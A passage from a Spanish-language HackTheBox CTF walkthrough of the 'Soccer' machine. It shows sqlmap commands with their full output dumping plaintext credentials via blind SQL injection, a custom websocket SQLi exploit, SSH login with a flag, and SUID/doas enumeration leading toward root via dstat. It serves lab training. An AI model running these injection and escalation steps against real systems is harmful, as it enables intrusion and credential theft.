+</code></pre></div><p>El <em>payload</em> en JSON es correcto, por lo que ahora podemos iniciar el servidor <em>proxy</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">proxy.py</span>
+[+] Starting MiddleWare Server
+[+] Send payloads in http://localhost:8081/?id=*  
+</code></pre></div><p>Y ahora <code>sqlmap</code> funcionará:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> -u <span class="code-dark-yellow">'http://localhost:8081/?id=*'</span> --dbs --technique B --skip-waf --level 5 --risk 3 --batch
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">,</span>]_____ ___ ___</span>  <span class="code-white">{<span class="code-grey">1.7.2#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">"</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">"</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|</span>   <span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+<span class="code-white">custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-yellow">WARNING</span>] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] testing connection to the target URL</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] turning off pre-connect mechanism because of incompatible server ('<span class="code-white">SimpleHTTP/0.6 Python/3.10.10</span>')
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing if the target URL content is stable
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] target URL content is stable
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing if URI parameter '<span class="code-white">#1*</span>' is dynamic
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] URI parameter '<span class="code-white">#1*</span>' appears to be dynamic
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-yellow">WARNING</span>] heuristic (basic) test shows that URI parameter '#1*' might not be injectable</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing for SQL injection on URI parameter '<span class="code-white">#1*</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">AND boolean-based blind - WHERE or HAVING clause</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">OR boolean-based blind - WHERE or HAVING clause</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] URI parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>]heuristic (extended) test shows that the back-end DBMS could be 'MySQL'</span>
+<span class="code-white">it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] in OR boolean-based injection cases, please consider usage of switch '<span class="code-white">--drop-set-cookie</span>' if you experience any problems during data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] checking if the injection point on URI parameter '<span class="code-white">#1*</span>' is a false positive
+<span class="code-white">URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+sqlmap identified the following injection point(s) with a total of 171 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:8081/?id=-4215 OR 6811=6811
+---
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing MySQL
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] confirming MySQL
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] the back-end DBMS is MySQL</span>
+back-end DBMS: MySQL &gt;= 8.0.0
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching database names
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of databases
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] running in a single-thread mode. Please consider usage of option '<span class="code-white">--threads</span>' for faster data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 5
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: mysql
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: information_schema
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: performance_schema
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: sys
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: soccer_db
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+
+[*] ending
+</code></pre></div><p>Vamos directamente al grano. El siguiente paso es enumerar las tablas en una determinada base de datos (la más interesante es <code>soccer_db</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> -u <span class="code-dark-yellow">'http://localhost:8081/?id=*'</span> -D soccer_db --tables --technique B --skip-waf --level 5 --risk 3 --batch
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">(</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.7.2#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">(</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">'</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+<span class="code-white">custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-yellow">WARNING</span>] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] resuming back-end DBMS '<span class="code-white">mysql</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] testing connection to the target URL</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] turning off pre-connect mechanism because of incompatible server ('<span class="code-white">SimpleHTTP/0.6 Python/3.10.10</span>')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:8081/?id=-4215 OR 6811=6811
+---
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] the back-end DBMS is MySQL</span>
+back-end DBMS: MySQL 8
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching tables for database: '<span class="code-white">soccer_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of tables for database '<span class="code-white">soccer_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] running in a single-thread mode. Please consider usage of option '<span class="code-white">--threads</span>' for faster data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 1
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: accounts
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+
+[*] ending
+</code></pre></div><p>Solo hay una tabla. Enumeremos sus columnas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> -u <span class="code-dark-yellow">'http://localhost:8081/?id=*'</span> -D soccer_db -T accounts --columns --technique B --skip-waf --level 5 --risk 3 --batch
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">"</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.7.2#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">)</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">"</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and f  
+ederal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting
+
+<span class="code-white">custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-yellow">WARNING</span>] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] resuming back-end DBMS '<span class="code-white">mysql</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] testing connection to the target URL</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] turning off pre-connect mechanism because of incompatible server ('<span class="code-white">SimpleHTTP/0.6 Python/3.10.10</span>')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:8081/?id=-4215 OR 6811=6811
+---
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] the back-end DBMS is MySQL</span>
+back-end DBMS: MySQL 8
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching columns for table '<span class="code-white">accounts</span>' in database '<span class="code-white">soccer_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] running in a single-thread mode. Please consider usage of option '<span class="code-white">--threads</span>' for faster data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 4
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: id
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: int
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: email
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: varchar(40)
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: username
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: varchar(40)
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: password
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: varchar(40)
+Database: soccer_db
+Table: accounts
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| email    | varchar(40) |
+| id       | int         |
+| password | varchar(40) |
+| username | varchar(40) |
++----------+-------------+
+
+[*] ending
+</code></pre></div><p>Y ahora miramos qué datos hay en las columnas <code>username</code> y <code>password</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> -u <span class="code-dark-yellow">'http://localhost:8081/?id=*'</span> -D soccer_db -T accounts -C username,password --dump --technique B --skip-waf --level 5 --risk 3 --batch
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">.</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.7.2#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">,</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">)</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+<span class="code-white">custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-yellow">WARNING</span>] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] resuming back-end DBMS '<span class="code-white">mysql</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] testing connection to the target URL</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] turning off pre-connect mechanism because of incompatible server ('<span class="code-white">SimpleHTTP/0.6 Python/3.10.10</span>')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: http://localhost:8081/?id=-4215 OR 6811=6811
+---
+[<span class="code-dark-cyan">hh:mm:ss</span>]<span class="code-white"> [<span class="code-green">INFO</span>] the back-end DBMS is MySQL</span>
+back-end DBMS: MySQL 8
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching entries of column(s) '<span class="code-white">password,username</span>' for table '<span class="code-white">accounts</span>' in database '<span class="code-white">soccer_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of column(s) '<span class="code-white">password,username</span>' entries for table '<span class="code-white">accounts</span>' in database '<span class="code-white">soccer_db</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] running in a single-thread mode. Please consider usage of option '<span class="code-white">--threads</span>' for faster data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 1
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: PlayerOftheMatch2022
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: player
+Database: soccer_db
+Table: accounts
+[1 entry]
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| player   | PlayerOftheMatch2022 |
++----------+----------------------+
+
+[*] ending
+</code></pre></div><p>Perfecto, tenemos unas credenciales en texto claro.</p><p>Sin embargo, este es un enfoque de <em>script-kiddie</em>. Como dice <a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">el artículo</a>, se recomienda escribir un <em>script</em> personalizado para explotar un SQLi de tipo <em>Boolean-based Blind</em> al menos una vez.</p><h3 id="_exploit_-personalizado"><em>Exploit</em> personalizado</h3><p>He aquí mi contribución: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Soccer/websocket_sqli.py"><code>websocket_sqli.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Soccer#websocket_sqlipy">aquí</a>).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">websocket_sqli.py</span>
+{
+  "soccer_db": {
+    "accounts": {
+      "id": [
+        "1324"
+      ],
+      "email": [
+        "player@player.htb"
+      ],
+      "username": [
+        "player"
+      ],
+      "password": [
+        "PlayerOftheMatch2022"  
+      ]
+    }
+  }
+}
+
+Time: 144.9353368282318 s
+</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Ahora que tenemos un nombre de usuario (<code>player</code>) y una contraseña en texto claro (<code>PlayerOftheMatch2022</code>), podemos intentar conectarnos a la máquina por SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> player@10.10.11.194
+player@10.10.11.194's password:
+<span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ cat user.txt
+2355bdcc1f0d682ade5cde4f7ae38c47  
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Si enumeramos binarios SUID, encontramos <code>doas</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ find / -perm -4000 2&gt;/dev/null | grep -v snap  
+/usr/local/bin/doas
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+</code></pre></div><p>Este programa es como <code>sudo</code>, nos permite ejecutar comandos específicos como otros usuarios (por ejemplo, <code>root</code>). Podemos echar un ojo a la <a href="https://wiki.archlinux.org/title/Doas">documentación</a> para aprender a usar este programa. Parece que debe haber una archivo de configuración llamado <code>doas.conf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ find / -name doas.conf 2&gt;/dev/null  
+/usr/local/etc/doas.conf
+<span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ cat /usr/local/etc/doas.conf
+permit nopass player as root cmd /usr/bin/dstat
+</code></pre></div><p>Vemos que podemos ejecutar <code>dstat</code> como <code>root</code>. Este programa es de código abierto, construido en Python. En el <a href="https://github.com/dstat-real/dstat">repositorio de GitHub</a> podemos ver la implementación.</p><p>Se ve chulo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ dstat
+You did not select any stats, using -cdngy by default.
+<span class="code-dark-blue">--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--</span>
+<span class="code-blue mtku">usr</span> <span class="code-blue mtku">sys</span> <span class="code-blue mtku">idl</span> <span class="code-blue mtku">wai</span> <span class="code-blue mtku">stl</span><span class="code-dark-blue">|</span><span class="code-blue mtku"> read</span> <span class="code-blue mtku"> writ</span><span class="code-dark-blue">|</span><span class="code-blue mtku"> recv</span> <span class="code-blue mtku"> send</span><span class="code-dark-blue">|</span><span class="code-blue mtku">  in </span> <span class="code-blue mtku"> out </span><span class="code-dark-blue">|</span><span class="code-blue mtku"> int </span> <span class="code-blue mtku"> csw</span>
+<span class="code-grey">  0   0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-yellow">  14</span><span class="code-grey">k </span><span class="code-red">9958</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 264</span>  <span class="code-red"> 494</span>
+<span class="code-grey">  0 </span><span class="code-red">  1 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 132</span><span class="code-grey">B </span><span class="code-red"> 790</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 254</span><span class="code-grey">  </span><span class="code-red"> 505</span>
+<span class="code-grey">  0   0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 248</span><span class="code-grey">  </span><span class="code-red"> 479</span>
+<span class="code-red">  1 </span><span class="code-grey">  0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 236</span><span class="code-grey">  </span><span class="code-red"> 476</span>
+<span class="code-grey">  0   0 </span><span class="code-white">100 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 250</span><span class="code-grey">  </span><span class="code-red"> 498</span>
+<span class="code-red">  1 </span><span class="code-grey">  0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 176</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 264</span><span class="code-grey">  </span><span class="code-red"> 498</span>
+<span class="code-red">  1 </span><span class="code-grey">  0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 258</span><span class="code-grey">  </span><span class="code-red"> 514</span>
+<span class="code-red">  1 </span><span class="code-grey">  0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 260</span><span class="code-grey">  </span><span class="code-red"> 502</span>
+<span class="code-red">  1 </span><span class="code-grey">  0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 251</span><span class="code-grey">  </span><span class="code-red"> 494</span><span class="code-grey"> ^C</span>  
+<span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ doas /usr/bin/dstat
+You did not select any stats, using -cdngy by default.
+<span class="code-dark-blue">--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--</span>
+<span class="code-blue mtku">usr</span> </span><span class="code-blue mtku">sys</span> </span><span class="code-blue mtku">idl</span> </span><span class="code-blue mtku">wai</span> </span><span class="code-blue mtku">stl</span><span class="code-dark-blue">|</span><span class="code-blue mtku"> read</span> </span><span class="code-blue mtku"> writ</span><span class="code-dark-blue">|</span><span class="code-blue mtku"> recv</span> </span><span class="code-blue mtku"> send</span><span class="code-dark-blue">|</span><span class="code-blue mtku">  in </span> </span><span class="code-blue mtku"> out </span><span class="code-dark-blue">|</span><span class="code-blue mtku"> int </span> </span><span class="code-blue mtku"> csw</span>
+<span class="code-grey">  0   0 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-yellow">  14</span><span class="code-grey">k </span><span class="code-red">9963</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 264</span><span class="code-grey">  </span><span class="code-red"> 494</span>
+<span class="code-grey">  0   0 </span><span class="code-white">100 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 132</span><span class="code-grey">B </span><span class="code-red"> 790</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 245</span><span class="code-grey">  </span><span class="code-red"> 468</span>
+<span class="code-red">  1   1 </span><span class="code-green"> 98 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 282</span><span class="code-grey">  </span><span class="code-red"> 555</span>
+<span class="code-grey">  0 </span><span class="code-red">  1 </span><span class="code-green"> 99 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 250</span><span class="code-grey">  </span><span class="code-red"> 487</span>
+<span class="code-red">  2   2 </span><span class="code-green"> 96 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0  </span><span class="code-yellow">  60</span><span class="code-grey">k</span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 342</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 280</span><span class="code-grey">  </span><span class="code-red"> 660</span>
+<span class="code-red">  1   1 </span><span class="code-green"> 98 </span><span class="code-grey">  0   0</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red">  66</span><span class="code-grey">B </span><span class="code-red"> 350</span><span class="code-grey">B</span><span class="code-dark-blue">|</span><span class="code-grey">   0     0 </span><span class="code-dark-blue">|</span><span class="code-red"> 275</span><span class="code-grey">  </span><span class="code-red"> 502</span><span class="code-grey"> ^C</span>
+</code></pre></div><p>El programa tiene muchas opciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">player@soccer</span>:<span class="code-blue">~</span>$ dstat --help
+Usage: dstat [-afv] [options..] [delay [count]]
+Versatile tool for generating system resource statistics)
+
+Dstat options:
+  -c, --cpu                enable cpu stats
+     -C 0,3,total             include cpu0, cpu3 and total
